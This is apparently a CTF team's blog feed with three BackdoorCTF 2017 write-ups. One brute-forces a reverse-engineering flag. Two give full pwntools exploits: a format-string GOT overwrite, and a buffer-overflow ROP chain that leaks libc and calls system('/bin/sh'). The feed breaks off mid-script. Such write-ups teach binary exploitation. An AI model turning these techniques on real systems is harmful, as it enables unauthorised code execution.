<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>TEAMROCKETIST</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://teamrocketist.github.io/"/>
  <updated>2017-09-26T11:17:04.585Z</updated>
  <id>https://teamrocketist.github.io/</id>
  
  <author>
    <name>TEAMROCKETIST</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>[Reverse] BackdoorCTF 2017 - NO-CALM</title>
    <link href="https://teamrocketist.github.io/2017/09/26/Reverse-BackdoorCTF-2017-NO-CALM/"/>
    <id>https://teamrocketist.github.io/2017/09/26/Reverse-BackdoorCTF-2017-NO-CALM/</id>
    <published>2017-09-26T11:09:07.000Z</published>
    <updated>2017-09-26T11:17:04.585Z</updated>
    
    <content type="html"><![CDATA[<p>Reverse challenge, using IDA to convert the binary into c pseudo code:<br><a data-fancybox="gallery" href="https://i.imgur.com/7mmkV78.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/7mmkV78.png" alt=""><br></a></p>
<p>We can see that the flag must be in the arguments of the flag, each byte of the flag will be an argv, the flag has 31 bytes as we can see in <code>if</code> check. Looking at the generated code we can see that each byte of the flag is being saved from the variable v6 to v35. After this we can see a bunch of <code>if</code> verifications:<br><a data-fancybox="gallery" href="https://i.imgur.com/jwvteoW.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/jwvteoW.png" alt=""><br></a><br>We can see it checks 3 bytes at time, with 3 different operation checks:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(v7+v6-v8 == key[<span class="number">0</span>] &amp;&amp; v6-v7+v8 == key[<span class="number">1</span>] &amp;&amp; v7-v6+v8 == key[<span class="number">2</span>]) == <span class="literal">true</span></div></pre></td></tr></table></figure>
<p>And this repeats for all 3 bytes along the flag… it’s simple to write a python script to brute force the flag:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> string</div><div class="line"></div><div class="line">a =  string.printable</div><div class="line">keys = [<span class="number">81</span>,<span class="number">53</span>,<span class="number">87</span>,<span class="number">90</span>,<span class="number">156</span>,<span class="number">66</span>,<span class="number">98</span>,<span class="number">140</span>,<span class="number">92</span>,<span class="number">38</span>,<span class="number">170</span>,<span class="number">60</span>,<span class="number">29</span>,<span class="number">161</span>,<span class="number">69</span>,<span class="number">163</span>,<span class="number">27</span>,<span class="number">69</span>,<span class="number">147</span>,<span class="number">43</span>,<span class="number">59</span>,<span class="number">146</span>,<span class="number">86</span>,<span class="number">44</span>,<span class="number">67</span>,<span class="number">89</span>,<span class="number">75</span>,<span class="number">117</span>,<span class="number">125</span>,<span class="number">125</span>]</div><div class="line">flags = []</div><div class="line">s = <span class="string">''</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(keys),<span class="number">3</span>):</div><div class="line">	<span class="keyword">for</span> b <span class="keyword">in</span> a:</div><div class="line">		<span class="keyword">for</span> c <span class="keyword">in</span> a:</div><div class="line">			<span class="keyword">for</span> d <span class="keyword">in</span> a:</div><div class="line">				<span class="keyword">if</span> ord(c)+ord(b)-ord(d) == keys[i] <span class="keyword">and</span> ord(b)-ord(c)+ord(d) == keys[i+<span class="number">1</span>] <span class="keyword">and</span> ord(c)-ord(b)+ord(d) == keys[i+<span class="number">2</span>]:</div><div class="line">					s += b+c+d</div><div class="line">					<span class="keyword">print</span> s</div></pre></td></tr></table></figure>
<p>Running it:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">$ python nocalm.py </div><div class="line">CTF</div><div class="line">CTF&#123;No</div><div class="line">CTF&#123;Now_t</div><div class="line">CTF&#123;Now_th1s</div><div class="line">CTF&#123;Now_th1s_1s</div><div class="line">CTF&#123;Now_th1s_1s_t0</div><div class="line">CTF&#123;Now_th1s_1s_t0_g3</div><div class="line">CTF&#123;Now_th1s_1s_t0_g3t_A</div><div class="line">CTF&#123;Now_th1s_1s_t0_g3t_ANGR</div><div class="line">CTF&#123;Now_th1s_1s_t0_g3t_ANGRyy&#125;</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Reverse challenge, using IDA to convert the binary into c pseudo code:&lt;br&gt;&lt;a data-fancybox=&quot;gallery&quot; href=&quot;https://i.imgur.com/7mmkV78.pn
    
    </summary>
    
      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
    
    
      <category term="backdoorctf" scheme="https://teamrocketist.github.io/tags/backdoorctf/"/>
    
      <category term="reverse" scheme="https://teamrocketist.github.io/tags/reverse/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] BackdoorCTF 2017 - baby0x41414141</title>
    <link href="https://teamrocketist.github.io/2017/09/25/Pwn-BackdoorCTF-2017-baby0x41414141/"/>
    <id>https://teamrocketist.github.io/2017/09/25/Pwn-BackdoorCTF-2017-baby0x41414141/</id>
    <published>2017-09-25T04:46:07.000Z</published>
    <updated>2017-09-26T05:41:55.080Z</updated>
    
    <content type="html"><![CDATA[<p><a data-fancybox="gallery" href="https://i.imgur.com/pX6qbFQ.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/pX6qbFQ.png" alt=""><br></a><br><em>1.1 - format string vulnerability.</em></p>
<p>We have a format string vulnerability we can confirm this by running the binary:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ ./32_new </div><div class="line">Hello baby pwner, whats your name?</div><div class="line">%x</div><div class="line">Ok cool, soon we will know whether you pwned it or not. Till <span class="keyword">then</span> Bye 8048914</div></pre></td></tr></table></figure>
<p>A there it is, we leaked an address from the stack, analysing the binary again we can see we already have a cool function that calls <code>system(&#39;cat flag.txt&#39;)</code> so we don’t have to actually leak libc addresses and go through all that trouble:<br><a data-fancybox="gallery" href="https://i.imgur.com/TIY3ZzO.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/TIY3ZzO.png" alt=""><br></a><br><em>1.2 - flag function.</em></p>
<p>This one is really simple:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1 - Calculate the offset of the address we put in the stack using %p.</div><div class="line">2 - Modify the exit function address with flag function using %n.</div></pre></td></tr></table></figure>
<p>Before going into an explanation I’ll show you some modifiers from <code>printf</code> man page this will be useful since we want to override a certain number of bytes and this length modifiers will help us on that.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">An optional length modifier, that specifies the size of the argument.</div><div class="line">         The following length modifiers are valid for the d, i, n, o, u, x, or</div><div class="line">         X conversion:</div><div class="line"></div><div class="line">         Modifier          d, i           o, u, x, X            n</div><div class="line">         hh                signed char    unsigned char         signed char *</div><div class="line">         h                 short          unsigned short        short *</div><div class="line">         l (ell)           long           unsigned long         long *</div><div class="line">         ll (ell ell)      long long      unsigned long long    long long *</div><div class="line">         j                 intmax_t       uintmax_t             intmax_t *</div><div class="line">         t                 ptrdiff_t      (see note)            ptrdiff_t *</div><div class="line">         z                 (see note)     size_t                (see note)</div><div class="line">         q (deprecated)    quad_t         u_quad_t              quad_t *</div></pre></td></tr></table></figure>
<p>For example if we want to override an address like this <code>0x0804870b</code> this a 32 bit address so if we need to change all the bits we would use <code>%ln</code> which is a long and it’s 32 bits or we could even use <code>%lln</code> would work too since is 64 bit (long long). </p>
<p>Usually we want to use <code>%hn</code> so we can override 2 bytes(16 bits) at each if we get greedy and try to override it as long when the binary prints the string output it will take a lot of time since it needs <code>0x0804870b</code> spaces to be printed, this is why we prefer to use %hn the address but this time we need to do it in two operations instead of one.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">0804 -&gt; <span class="string">'%11hn'</span></div><div class="line">870b -&gt; <span class="string">'%10hn'</span></div></pre></td></tr></table></figure>
<h3 id="Stack-address-offset-calculation"><a href="#Stack-address-offset-calculation" class="headerlink" title="Stack address offset calculation"></a>Stack address offset calculation</h3><p>We can do this by printing a bunch of addresses from the stack using <code>%x</code> or <code>%p</code>, we can insert some ‘AAAA’ in the beginning and the a bunch of <code>%x</code> and check on which location the ‘AAAA’ are positioned in the stack.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></div><div class="line">	<span class="keyword">return</span> process(<span class="string">'./32_new'</span>) <span class="keyword">if</span> local <span class="keyword">else</span> remote(<span class="string">'163.172.176.29'</span>, <span class="number">9035</span>)</div><div class="line">r =getConn()</div><div class="line">r.recvuntil(<span class="string">'Hello baby pwner, whats your name?\n'</span>)</div><div class="line">s = <span class="string">'AAAA'</span>+ <span class="string">'%x,'</span>*<span class="number">20</span></div><div class="line">r.sendline(s)</div></pre></td></tr></table></figure>
<p>We can see our <code>41414141</code> will appear in the position 10th, we now know where its located in the stack when we put some strings in the beginning: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ python 32_new.py </div><div class="line">Ok cool, soon we will know whether you pwned it or not. Till then Bye AAAA8048914,ff92ee98,1,f745c618,36e,f7462668,ff92f144,ff92eee4,ff92eee0,41414141,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,</div></pre></td></tr></table></figure>
<p>To access its position we can do like this:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">'%10$hn'</span></div></pre></td></tr></table></figure>
<h3 id="Override-exit-function"><a href="#Override-exit-function" class="headerlink" title="Override exit function"></a>Override exit function</h3><p>Now we need to calculate how much characters we need to add into our format expression, for example we needed 100 we can do it like this:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">'%100%10$hn'</span></div></pre></td></tr></table></figure>
<p>Now starting the exploit we can easily get the exit <code>GOT</code> address with <code>pwntools</code> and the flag function we can get it from radare2 you can check it at the picture 1.2 above.</p>
<p>One nice trick is to clear the existing <code>EXIT</code> function address with <code>%10$lln</code> of course since we are adding some characters at the begining of the string the address won’t be converted to 0 in this case it actually turned into <code>0x0000004e</code>, 0x4e is 78 in decimal and that’s why I’m subtracting in the 78! And there is another thing, is very cleaver is to split the address in half using some bit operations with this we know exactly which characters to add (of course you still need to do some debugging in <code>gdb</code>).</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">EXIT_GOT = binary.got[<span class="string">'exit'</span>]</div><div class="line"></div><div class="line">FLAG_LOW = FLAG &amp; <span class="number">0xffff</span></div><div class="line">FLAG_HIGH = (FLAG &amp; <span class="number">0xffff0000</span>) &gt;&gt; <span class="number">16</span></div><div class="line"></div><div class="line">s = p32(EXIT_GOT)</div><div class="line">s += p32(EXIT_GOT+<span class="number">2</span>)</div><div class="line">s += <span class="string">'%10$lln'</span> <span class="comment"># clears the already existing exit address</span></div><div class="line">s += <span class="string">'%&#123;&#125;x%11$hn'</span>.format(FLAG_HIGH<span class="number">-78</span>)</div><div class="line">s += <span class="string">'%&#123;&#125;x%10$hn'</span>.format(FLAG_LOW-FLAG_HIGH)</div></pre></td></tr></table></figure>
<p>The full exploit:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">local = <span class="keyword">False</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></div><div class="line">	<span class="keyword">return</span> process(<span class="string">'./32_new'</span>) <span class="keyword">if</span> local <span class="keyword">else</span> remote(<span class="string">'163.172.176.29'</span>, <span class="number">9035</span>)</div><div class="line"></div><div class="line">r =getConn()</div><div class="line"><span class="comment">#gdb.attach(r, '''</span></div><div class="line"><span class="comment">#	b *0x08048724</span></div><div class="line"><span class="comment">#	c''')</span></div><div class="line">binary = ELF(<span class="string">'./32_new'</span>)</div><div class="line">FLAG = <span class="number">0x0804870b</span></div><div class="line">EXIT_GOT = binary.got[<span class="string">'exit'</span>]</div><div class="line"></div><div class="line">FLAG_LOW = FLAG &amp; <span class="number">0xffff</span></div><div class="line">FLAG_HIGH = (FLAG &amp; <span class="number">0xffff0000</span>) &gt;&gt; <span class="number">16</span></div><div class="line"></div><div class="line">s = p32(EXIT_GOT)</div><div class="line">s += p32(EXIT_GOT+<span class="number">2</span>)</div><div class="line">s += <span class="string">'%10$lln'</span> <span class="comment"># clears the already existing exit address</span></div><div class="line">s += <span class="string">'%&#123;&#125;x%11$hn'</span>.format(FLAG_HIGH<span class="number">-78</span>)</div><div class="line">s += <span class="string">'%&#123;&#125;x%10$hn'</span>.format(FLAG_LOW-FLAG_HIGH)</div><div class="line">r.recvuntil(<span class="string">'Hello baby pwner, whats your name?\n'</span>)</div><div class="line">r.sendline(s)</div><div class="line"><span class="keyword">print</span> r.recvall(timeout=<span class="number">1</span>)</div><div class="line">r.close()</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a data-fancybox=&quot;gallery&quot; href=&quot;https://i.imgur.com/pX6qbFQ.png&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;br&gt;&lt;img src=&quot;https://i.imgur.com/pX6qbF
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
    
      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
    
      <category term="backdoorctf" scheme="https://teamrocketist.github.io/tags/backdoorctf/"/>
    
      <category term="formatString" scheme="https://teamrocketist.github.io/tags/formatString/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] BackdoorCTF 2017 - Justdoit</title>
    <link href="https://teamrocketist.github.io/2017/09/25/Pwn-BackdoorCTF-2017-Justdoit/"/>
    <id>https://teamrocketist.github.io/2017/09/25/Pwn-BackdoorCTF-2017-Justdoit/</id>
    <published>2017-09-25T01:57:29.000Z</published>
    <updated>2017-09-25T04:54:39.302Z</updated>
    
    <content type="html"><![CDATA[<p><a data-fancybox="gallery" href="https://i.imgur.com/zgcdKZK.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/zgcdKZK.png" alt=""><br></a></p>
<p><em>1.1 - representation of the assembly code of the binary</em></p>
<p>So we have 32 bit binary and a buffer overflow vulnerability, lets use <a href="https://github.com/slimm609/checksec.sh" target="_blank" rel="external">checksec</a> to see its protections:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Arch:     i386-32-little</div><div class="line">RELRO:    Partial RELRO</div><div class="line">Stack:    No canary found</div><div class="line">NX:       NX enabled</div><div class="line">PIE:      No PIE (0x8048000)</div></pre></td></tr></table></figure>
<p>There isn’t a stack canary protection but we have <code>NX ENABLED</code> so we can’t execute code in the stack we have to use Return Oriented Programming(ROP) to leak libc addresses and finally return to libc… We can check which functions are available for us using objdump:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">$ objdump -R justdoit </div><div class="line"></div><div class="line">justdoit:     file format elf32-i386</div><div class="line"></div><div class="line">DYNAMIC RELOCATION RECORDS</div><div class="line">OFFSET   TYPE              VALUE </div><div class="line">08049ffc R_386_GLOB_DAT    __gmon_start__</div><div class="line">0804a00c R_386_JUMP_SLOT   <span class="built_in">read</span>@GLIBC_2.0</div><div class="line">0804a010 R_386_JUMP_SLOT   <span class="built_in">printf</span>@GLIBC_2.0</div><div class="line">0804a014 R_386_JUMP_SLOT   __gmon_start__</div><div class="line">0804a018 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0</div><div class="line">0804a01c R_386_JUMP_SLOT   write@GLIBC_2.0</div></pre></td></tr></table></figure>
<p>We have <code>write</code> which is everything we need to do this challenge, using write we can leak addresses from the Global Offset Table (GOT) with the leaks we can calculate the offsets using the lib.so that was provided by the challenge.</p>
<p>Here is the plan to exploit it:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1 - Overflow the buffer</div><div class="line">2 - Using ROP to leak GOT addresses with write function and return to main</div><div class="line">3 - Overflow the buffer again and jump to system with /bin/sh as argument</div></pre></td></tr></table></figure>
<h3 id="Overflow-the-buffer"><a href="#Overflow-the-buffer" class="headerlink" title="Overflow the buffer"></a>Overflow the buffer</h3><p>According to the assembly code at picture 1.1 the read function will read up to 200 bytes so lets use <code>metasploit</code> to create a 200 byte pattern:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200</div><div class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag</div></pre></td></tr></table></figure>
<p>Now lets see on each address it will break using <code>gdb</code> : </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; r</div><div class="line">Starting program: /home/evilgod/Documents/Hacking/ctf/backdoor/pwn/justdoit/justdoit </div><div class="line">Hello pwners, </div><div class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag</div><div class="line"></div><div class="line">Program received signal SIGSEGV, Segmentation fault.</div><div class="line">Program received signal SIGSEGV (fault address 0x64413764)</div></pre></td></tr></table></figure>
<p>As we can see we have a page fault error at the address <code>0x64413764</code> so once again lets use <code>metasploit</code> to calculate the offset:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x64413764</div><div class="line">[*] Exact match at offset 112</div></pre></td></tr></table></figure>
<h3 id="ROP-and-leak-libc-addresses"><a href="#ROP-and-leak-libc-addresses" class="headerlink" title="ROP and leak libc addresses"></a>ROP and leak libc addresses</h3><p><code>write</code> needs 3 arguments as follows:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">ssize_t</span> write(<span class="keyword">int</span> fildes, <span class="keyword">const</span> <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> nbytes);</div></pre></td></tr></table></figure>
<p>We can use <code>pwntools</code> to get the GOT and PLT addresses from the binary (note that you can use <code>objdump</code> too to achieve the same result). Memorize this if you are beginner in binary exploitation and don’t understand really well what GOT is, just remember if you want to jump and execute a function from <code>libc</code> you jump into <code>PLT</code> but if you want to leak an address from libc you get the value from the <code>GOT</code> address.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">binary = ELF(<span class="string">'./justdoit'</span>)</div><div class="line">libc = ELF(<span class="string">'libc.so.6'</span>)</div><div class="line">padding = <span class="string">'A'</span>*<span class="number">112</span></div><div class="line">WRITEPLT = binary.plt[<span class="string">'write'</span>]</div><div class="line">PRINTFGOT = binary.got[<span class="string">'printf'</span>]</div><div class="line">MAIN = <span class="number">0x804847d</span> <span class="comment"># You can get this from radare2 for example</span></div></pre></td></tr></table></figure>
<p>Since the binary is 32 bits we don’t really need to <code>pop</code> stack address into specific registers like in 64 bit a simple <code>ropchain</code> to leak <code>printf</code> address can be built like this:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ropchain = <span class="string">''</span></div><div class="line">ropchain += p32(WRITEPLT) <span class="comment"># WRITE function "call"</span></div><div class="line">ropchain += p32(MAIN) <span class="comment"># RETURN TO MAIN</span></div><div class="line">ropchain += p32(<span class="number">0x1</span>) <span class="comment"># STDIN ARG[0]</span></div><div class="line">ropchain += p32(PRINTFGOT) <span class="comment"># PRINTF ADDRESS ARG[1]</span></div><div class="line">ropchain += p32(<span class="number">0x4</span>) <span class="comment"># BYTES TO READ ARG[2]</span></div></pre></td></tr></table></figure>
<p>After we send this to the server, we can calculate everything with <code>symbols</code> from <code>pwntools</code> : </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">r = getConn()</div><div class="line"></div><div class="line">r.recvline()</div><div class="line">r.sendline(padding+ropchain)</div><div class="line">r.recv(len(padding)+len(ropchain)) <span class="comment"># reads the printf output</span></div><div class="line"></div><div class="line">PRINTF = u32(r.recv(<span class="number">0x4</span>)) <span class="comment"># leaked printf address</span></div><div class="line">LIBCBASE = PRINTF - libc.symbols[<span class="string">'printf'</span>]</div><div class="line">SYSTEM = LIBCBASE + libc.symbols[<span class="string">'system'</span>]</div><div class="line">BINSH = LIBCBASE + <span class="number">0x15900b</span></div><div class="line"></div><div class="line">log.info(<span class="string">"LIBC 0x%x"</span> % LIBCBASE)</div><div class="line">log.info(<span class="string">"PRINTF 0x%x"</span> % PRINTF)</div><div class="line">log.info(<span class="string">"SYSTEM 0x%x"</span> % SYSTEM)</div><div class="line">log.info(<span class="string">"Binsh 0x%x"</span> % BINSH)</div></pre></td></tr></table></figure>
<p>If you are wondering where I got the offset of <code>/bin/sh</code> string , you can use a nice trick with strings command:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ strings -a -t x libc.so.6 | grep <span class="string">'/bin/sh'</span></div><div class="line"> 15900b /bin/sh</div></pre></td></tr></table></figure>
<h3 id="Overflow-again-and-jump-to-libc"><a href="#Overflow-again-and-jump-to-libc" class="headerlink" title="Overflow again and jump to libc"></a>Overflow again and jump to libc</h3><p>Now that we have <code>system</code> and <code>/bin/sh</code> string we can just jump into them! note that I had to readjust the padding offset (use gdb to check the values on the <code>stack</code> to calculate the offset):</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">ropchain2 = p32(SYSTEM) <span class="comment"># WRITE function "call"</span></div><div class="line">ropchain2 += <span class="string">'BBBB'</span> <span class="comment"># Return address doesn't really matter to where we return after shell</span></div><div class="line">ropchain2 += p32(BINSH)</div><div class="line"></div><div class="line">r.recvuntil(<span class="string">'Hello pwners, \n'</span>)</div><div class="line">r.sendline(<span class="string">'A'</span>*(<span class="number">112</span><span class="number">-8</span>)+ropchain2)</div><div class="line">r.recv()</div><div class="line">r.interactive()</div><div class="line">r.close()</div></pre></td></tr></table></figure>
<p>And now the full script:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line"></div><div class="line">local = <span class="keyword">True</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></div><div class="line">	<span class="keyword">return</span> process(<span class="string">'./justdoit'</span>, env = &#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">'./libc.so.6'</span>&#125;) <span class="keyword">if</span> local <span class="keyword">else</span> remote(<span class="string">'163.172.176.29'</span>, <span class="number">9036</span>)</div><div class="line"></div><div class="line">padding = <span class="string">'A'</span>*<span class="number">112</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">binary = ELF(<span class="string">'./justdoit'</span>)</div><div class="line">libc = ELF(<span class="string">'libc.so.6'</span>)</div><div class="line"></div><div class="line">WRITEPLT = binary.plt[<span class="string">'write'</span>]</div><div class="line">PRINTFGOT = binary.got[<span class="string">'printf'</span>]</div><div class="line">MAIN = <span class="number">0x804847d</span> <span class="comment"># You can get this from radare2 for example</span></div><div class="line"></div><div class="line">ropchain = <span class="string">''</span></div><div class="line">ropchain += p32(WRITEPLT) <span class="comment"># PRINTF function "call"</span></div><div class="line">ropchain += p32(MAIN) <span class="comment"># RETURN TO MAIN</span></div><div class="line">ropchain += p32(<span class="number">0x1</span>) <span class="comment"># STDIN ARG[0]</span></div><div class="line">ropchain += p32(PRINTFGOT) <span class="comment"># PRINTF ADDRESS ARG[1]</span></div><div class="line">ropchain += p32(<span class="number">0x4</span>) <span class="comment"># BYTES TO READ ARG[2]</span></div><div class="line"></div><div class="line">r = getConn()</div><div class="line"></div><div class="line"><span class="comment">#gdb.attach(r, '''</span></div><div class="line"><span class="comment">#	b *0x080484d8</span></div><div class="line"><span class="comment">#	c''')</span></div><div class="line"></div><div class="line">r.recvline()</div><div class="line">r.sendline(padding+ropchain)</div><div class="line">r.recv(len(padding)+len(ropchain)) <span class="comment"># reads the printf output</span></div><div class="line"></div><div class="line">PRINTF = u32(r.recv(<span class="number">0x4</span>))</div><div class="line">LIBCBASE = PRINTF - libc.symbols[<span class="string">'printf'</span>]</div><div class="line">SYSTEM = LIBCBASE + libc.symbols[<span class="string">'system'</span>]</div><div class="line">BINSH = LIBCBASE + <span class="number">0x15900b</span></div><div class="line"></div><div class="line">log.info(<span class="string">"LIBC 0x%x"</span> % LIBCBASE)</div><div 